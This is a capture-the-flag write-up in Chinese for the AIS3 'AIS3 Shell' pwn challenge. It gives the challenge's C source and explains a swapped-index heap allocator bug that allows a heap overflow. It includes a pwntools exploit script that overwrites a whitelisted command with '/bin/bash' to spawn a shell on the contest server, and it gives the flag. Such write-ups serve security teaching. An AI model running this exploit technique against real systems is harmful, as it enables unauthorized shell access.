# PWN - AIS3 Shell
## 原始碼
佛心題目有給原始碼

```
#include <stdlib.h>
#include <assert.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#define SIZE_NUM 0x40
#define NUM_PER_SIZE 0x40
#define COMMAND_NUM 0x10

void* MEM[SIZE_NUM][NUM_PER_SIZE];
int MEM_Used[SIZE_NUM][NUM_PER_SIZE];

struct CMD{
    char *name;
    char *cmd;
} Command[COMMAND_NUM];
int Command_defined[COMMAND_NUM];

void InitAlloc()
{
    for(int i=0;i<SIZE_NUM;i++){
        for(int j=0;j<NUM_PER_SIZE;j++){
            MEM[i][j] = malloc(0x100*(i+1));
        }
    }
}

void* MemAlloc(size_t size)
{
    if(size<=0){
        size += 1;
    }
    if(size%0x100){
        size = ((size>>8)+1);
    }
    else{
        size = size>>8;
    }

    for(int i=size-1;i<SIZE_NUM;i++){
        for(int j=0;j<NUM_PER_SIZE;j++){
            if(MEM_Used[j][i]==0){
                MEM_Used[j][i] = 1;
                return MEM[j][i];
            }
        }
    }
    assert(0);
    return NULL;
}

void MemFree(void *ptr)
{
    for(int i=0;i<SIZE_NUM;i++){
        for(int j=0;j<NUM_PER_SIZE;j++){
            if(MEM[i][j] == ptr){
                MEM_Used[i][j] = 0;
            }
        }
    }
}

int read_int()
{
    char buf[0x10];
    read(0, buf, 10);
    return atoi(buf);
}

void read_str(char *buf, size_t len)
{
    for(int i=0;i<len;i++){
        assert(read(0, &buf[i], 1)>0);
        if(buf[i]=='\n'){
            buf[i] = 0;
            break;
        }
    }
}

void init_proc()
{
    setvbuf(stdout, 0, 2, 0);
    InitAlloc();
}

void banner()
{
    puts("    ___    ___________________ __         ____");
    puts("   /   |  /  _/ ___/__  / ___// /_  ___  / / /");
    puts("  / /| |  / / \\__ \\ /_ <\\__ \\/ __ \\/ _ \\/ / / ");
    puts(" / ___ |_/ / ___/ /__/ /__/ / / / /  __/ / /  ");
    puts("/_/  |_/___//____/____/____/_/ /_/\\___/_/_/   ");
    puts("                                              ");
}

void help()
{
    puts("+-------------------------------+");
    puts("|list - list commands.          |");
    puts("|define - define a command.     |");
    puts("|run [command] - run a command. |");
    puts("|help - show this message.      |");
    puts("+-------------------------------+");
}

void list_command()
{
    for(int i=0;i<COMMAND_NUM;i++){
        if(Command_defined[i]==0) continue;
        printf("%d. %s - %s\n", i, Command[i].name, Command[i].cmd);
    }
}

int command_check(char *cmd)
{
    size_t len = strlen(cmd);
    for(int i=0;i<len;i++){
        if(cmd[i]>='0'&&cmd[i]<='9')continue;
        if(cmd[i]>='a'&&cmd[i]<='z')continue;
        if(cmd[i]>='A'&&cmd[i]<='Z')continue;
        if(cmd[i]==' ')continue;
        return 0;
    }
    if(strncmp("echo", cmd, 4)==0) return 1;
    if(strncmp("ls", cmd, 2)==0) return 1;
    if(strncmp("sl", cmd, 2)==0) return 1;
    return 0;
}

void define_command()
{
    int cmdid=0;
    for(;Command_defined[cmdid] && cmdid<COMMAND_NUM;cmdid++);
    if(cmdid>=COMMAND_NUM){
        printf("No more command.\n");
        return ;
    }
    int namelen, cmdlen;
    printf("Length of command name: ");
    namelen = read_int();
    Command[cmdid].name = MemAlloc(namelen);
    printf("Command name: ");
    read_str(Command[cmdid].name, namelen);
    
    printf("Length of command: ");
    cmdlen = read_int();
    char *cmd = MemAlloc(cmdlen);
    printf("Command: ");
    read_str(cmd, cmdlen);
    if(command_check(cmd)==0){
        puts("Not allowed command.");
        return;
    }
    Command[cmdid].cmd = cmd;
    Command_defined[cmdid] = 1;
}

void run_command(char *name)
{
    size_t namelen = strlen(name);
    for(int i=0;i<COMMAND_NUM;i++){
        if(Command_defined[i]==0)continue;
        if(strcmp(Command[i].name, name)==0){
            system(Command[i].cmd);
            return ;
        }
    }
    puts("Command not found.");
    return ;
}

int main()
{
    init_proc();
    banner();
    char buf[0x30];
    while(1){
        printf("$ ");
        scanf("%[^\n]", buf);
        getchar();
        if(strncmp("list", buf, 4)==0){
            list_command();
        }
        else if(strncmp("define", buf, 6)==0){
            define_command();
        }
        else if(strncmp("run", buf, 3)==0){
            run_command(buf+4);
        }
        else{
            help();
        }
    }
    return 0;
}
```

## 程式理解
* InitAlloc() 會 malloc 很多塊不同大小的記憶體給 MEM[i][j]，大小為 i * 0x100
* define_command() 中會呼叫兩次 MemAlloc() 分別給 Command Name 和 Command，而且寫就寫了，就算 invalid，那塊記憶體的值就是給的那樣
* MemAlloc() 會根據 size 做些判斷，然後返回 MEM[j][i]

## 漏洞
洞就再 MEMAlloc() 返回的 MEM[j][i]，這邊 i 在後面，而 j 總是從 0 開始判斷。
所以如果輸入一個很大的數字例如 0x400，會返回的記憶體是只有 0x100 大小的 MEM[0][4]，也就是有 heap overflow。

所以一開始先創一個合法的 command，算好被分配的記憶體位址。
然後再做一次 define_command()，讓被分配的位址在上一個合法的 command 的上面，把下面的原本合法的 command 蓋掉

## exploit
```
from pwn import *

r = process('ais3shell')
r = remote('quiz.ais3.org', 10103 )

r.recvuntil('$')
r.sendline('define')
r.recvuntil(':')
r.sendline('3000')
r.recvuntil(':')
r.sendline('a' * 8)
r.recvuntil(':')
r.sendline('515')
r.recvuntil(':')
r.sendline('echo')

r.recvuntil('$')
r.sendline('define')
r.recvuntil(':')
r.sendline('100')
r.recvuntil(':')
r.sendline('c' * 8)
r.recvuntil(':')
r.sendline('500')
r.recvuntil(':')
r.sendline('d' * 16 * 17 + '/bin/bash')

r.recvuntil('$')
r.sendline('run aaaaaaaa')
r.interactive()
```

* flag: `AIS3{0hh_H0w_do_you_ch@ng3_my_comm4nd}`
